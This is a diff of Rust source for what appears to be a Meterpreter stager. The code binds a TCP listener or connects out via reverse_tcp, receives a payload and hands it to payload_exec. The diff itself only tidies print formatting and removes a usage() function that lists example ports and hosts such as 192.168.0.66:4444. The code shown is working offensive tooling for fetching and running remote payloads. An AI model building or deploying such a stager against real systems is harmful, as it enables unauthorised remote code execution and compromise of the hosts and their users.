@@ -11,7 +11,7 @@ pub fn run(addr: String) -> Result<(), Box<dyn Error>> {
         // Start a bind_tcp stager
         true => {
             let addr = format!("0.0.0.0{addr}");
-            println!("Using bind_tcp stager ({})", addr);
+            println!("Using bind_tcp stager ({addr})");
             let listener = TcpListener::bind(&addr)?;
             let (stream, _) = listener.accept()?;
             stream
@@ -19,7 +19,7 @@ pub fn run(addr: String) -> Result<(), Box<dyn Error>> {
 
         // Start a reverse_tcp stager
         false => {
-            println!("Using reverse_tcp stager ({})", addr);
+            println!("Using reverse_tcp stager ({addr})");
             TcpStream::connect(&addr)?
         }
     };
@@ -29,15 +29,6 @@ pub fn run(addr: String) -> Result<(), Box<dyn Error>> {
     payload_exec(payload);
 
     Ok(())
-}
-
-/// Print usage information
-pub fn usage(prog: &str) {
-    println!("Usage:");
-    println!("{prog} [:port | host:port]");
-    println!("\nExamples:");
-    println!("{prog} :4444");
-    println!("{prog} 192.168.0.66:4444");
 }
 
 /// Receive a Meterpreter payload via TCP
